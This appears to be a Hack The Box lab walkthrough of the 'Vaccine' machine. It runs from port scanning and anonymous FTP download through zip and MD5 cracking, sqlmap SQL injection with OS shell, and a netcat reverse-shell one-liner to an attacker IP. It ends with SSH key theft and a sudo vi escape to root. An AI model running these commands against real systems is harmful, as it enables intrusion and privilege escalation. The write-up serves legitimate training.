# HACKTHEBOX - Vaccine

## Enumeration
```bash
# Using rustscan to scan 65535 ports:
rustscan -a $IP -g # [21,22,80]

sudo nmap -sV -sC -v -oN nmap.txt -p 21,22,80 $IP
```

**nmap result**:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.198
|      Logged in as ftpuser
..........
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
........
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Ftp on port 21**: `allowed anonymous login`(any password)
```bash
ftp $IP 21
# username: anonymous
mget * # backup.zip
```

We got `backup.zip` file, but this file is password protected zip archive, let's `brute-force` the password:

```bash
# first thing first, using zip2john convert to hash format that john can understand
locate zip2john
/usr/sbin/zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash 
# password: 741852963        (backup.zip) 
````

Unzip with the password we found, we got `index.php` source code:
```php
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

This time, we using `crackstation.net` to find the password from md5 hash: 
```
2cb42f8734ea607eefed3b70af13bbd3 --> qwerty789
```

Log in web app with admin password we've found!!

OK, logged in, there're employees list have search function --> sqli --> YES!!

Let use `sqlmap` this time!!
```bash
# Remember to supply cookies, which we've logged in as admin
# --os-shell: Prompt for an interactive operating system shell (sweet!!)
sqlmap -u http://10.129.179.238/dashboard.php?search=hello --os-shell  --cookie='PHPSESSID=tbba04q6c3guadmj9lajpt0qca'
```

We got RCE!! --> Try to get a properly shell, this sqlmap shell keep asking about how to output stuff, so stupid!!

Using python reverse shell -> turn sqlmap shell off --> lost it

Using nc --> We're fine --> OK!!
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.198 8888 >/tmp/f
```
**From /var/lib/postgresql/user.txt**:

**user flag**: `HTB{ec9b13ca4d6229cd5cc1e099809XXXXX}`

With attempt to upgrade to interactive shell but after like 3 minutes, the connection just some how keep lossing --> luckily, check home directory(from `/etc/passwd`) which is `/var/lib/postgresql` have `.ssh` --> get `id_rsa` key

`authorized_keys`: postgres@vaccine --> the `username is postgres` not postgresql --> ssh shell!!
```bash
ssh -i id_rsa postgres@$IP
```
## Privilege Escalation

This user is postgres remember!, to try `sudo -l` we have to supply password so let's check file configuration for `postgresql`:

`/var/www/html/dashboard.php`: 
```php
<?php
	session_start();
	if($_SESSION['login'] !== "true") {
	  header("Location: index.php");
	  die();
	}
	try {
	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
	}
# ............
?>
```
We got postgres user password: `P@s5w0rd!`

```bash
sudo -l
# User postgres may run the following commands on vaccine:
#    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
We can using `vim` as root with `sudo` command, but it's being restricted by specific path directory so we cannot use `-c` flag to execute command in vim. However, `vim has execute command mode` in it text-edittor no matter what file vim has to open.
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# :!bash # spawn bash shell!
whoami # root
```

**From /root/root.txt**:

**root flag**: `HTB{dd6e058e814260bc70e9bbdef27XXXXX}`
